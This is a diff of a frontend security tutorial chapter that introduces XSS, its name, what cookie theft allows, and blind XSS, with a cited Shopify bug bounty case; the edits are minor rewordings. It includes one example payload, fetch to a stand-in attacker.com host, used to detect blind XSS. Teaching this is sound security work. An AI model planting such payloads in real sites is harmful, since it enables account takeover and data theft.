@@ -6,7 +6,7 @@ sidebar_position: 3
 
 In the preface of the first article, I mentioned that frontend security is not just about XSS, there are many interesting things to explore. However, XSS itself is quite fascinating and is commonly known as "frontend security". So, let's start with XSS as it is an essential topic that can teach you some things you may not have noticed before.
 
-From this point onwards, let's officially dive into the first chapter: "Starting with XSS for Frontend Security".
+From this point onwards, let's officially dive into the first chapter: "Starting with XSS".
 
 ## The Origin of XSS
 
@@ -26,7 +26,7 @@ Now, let's take a look at what XSS is.
 
 XSS stands for Cross-site scripting. It is not called CSS because CSS already stands for Cascading Style Sheets.
 
-From today's perspective, the name XSS may not be entirely accurate because many XSS attacks are not limited to being "Cross-site". I will explain the difference between "site" and "origin" later. This is crucial knowledge in frontend security.
+From today's perspective, the name XSS may not be entirely accurate because many XSS attacks are not limited to being "Cross-site". I will explain the difference between "site" and "origin" later in this series. This is crucial knowledge in frontend security.
 
 In simple terms, XSS allows attackers to execute JavaScript code on other people's websites.
 
@@ -56,7 +56,7 @@ This is why some people advocate storing authentication tokens in cookies rather
 
 If a website does not use the `HttpOnly` flag, one can use `document.cookie` or the updated `cookieStore` API to retrieve the website's cookies. Even if stealing is not possible, one can directly use `fetch()` to call APIs and see what functionalities can be manipulated on the website.
 
-For example, let's say YouTube has an XSS vulnerability. Attackers can exploit this vulnerability to add or delete videos, steal viewing history and backend data, and perform almost any action that a normal user can do.
+For example, let's say YouTube has an XSS vulnerability. Attackers can exploit this vulnerability to add or delete videos, steal viewing history and other data, and perform almost any action that a normal user can do.
 
 Have you ever wondered why many websites require re-entering the current password when changing passwords? Haven't we already logged in? Why do we need to enter it again? Do I not know my own password when changing it?
 
@@ -137,13 +137,13 @@ Although it may seem useless, when combined with other vulnerabilities, it is po
 
 Blind XSS means "XSS executed in a place and at a time you cannot see."
 
-Let's give another example. Suppose there is an e-commerce platform, and after testing, you find that there are no issues in any field and no XSS vulnerabilities are found. However, the e-commerce platform has an internal backend where all order data can be viewed, and this backend has a vulnerability. They forgot to encode the name field, so XSS can be executed using the name field.
+Let's give another example. Suppose there is an e-commerce platform, and after testing, you find that there are no issues in any field and no XSS vulnerabilities are found. However, the e-commerce platform has an internal portal where all order data can be viewed, and this portal has a vulnerability. They forgot to encode the name field, so XSS can be executed using the name field.
 
-In this case, we usually wouldn't know during testing because I don't have access to the backend, and I may not even know it exists. To test this situation, you need to change the content of the XSS payload from `alert()` to a payload that sends a packet, such as `fetch('https://attacker.com/xss')`. This way, when the XSS is triggered in an invisible place, it can be observed from the server.
+In this case, we usually wouldn't know during testing because I don't have access to the internal system, and I may not even know it exists. To test this situation, you need to change the content of the XSS payload from `alert()` to a payload that sends a packet, such as `fetch('https://attacker.com/xss')`. This way, when the XSS is triggered in an invisible place, it can be observed from the server.
 
 There are some ready-made services like [XSS Hunter](https://github.com/mandatoryprogrammer/xsshunter-express) that provide a platform for you to conveniently observe whether XSS is triggered. If triggered, it will return the triggered URL and other information on the screen.
 
-Speaking of actual cases, rioncool22 reported a vulnerability to Shopify in 2020: [Blind Stored XSS Via Staff Name](https://hackerone.com/reports/948929). They added an employee in Shopify's merchant backend and inserted an XSS payload in the name field. Although it did not trigger in the Shopify merchant backend, it triggered in Shopify's internal backend, and they received a reward of $3000.
+Speaking of actual cases, rioncool22 reported a vulnerability to Shopify in 2020: [Blind Stored XSS Via Staff Name](https://hackerone.com/reports/948929). They added an employee in Shopify's merchant portal and inserted an XSS payload in the name field. Although it did not trigger in the Shopify merchant portal, it triggered in Shopify's internal portal, and they received a reward of $3000.
 
 ## Conclusion
 
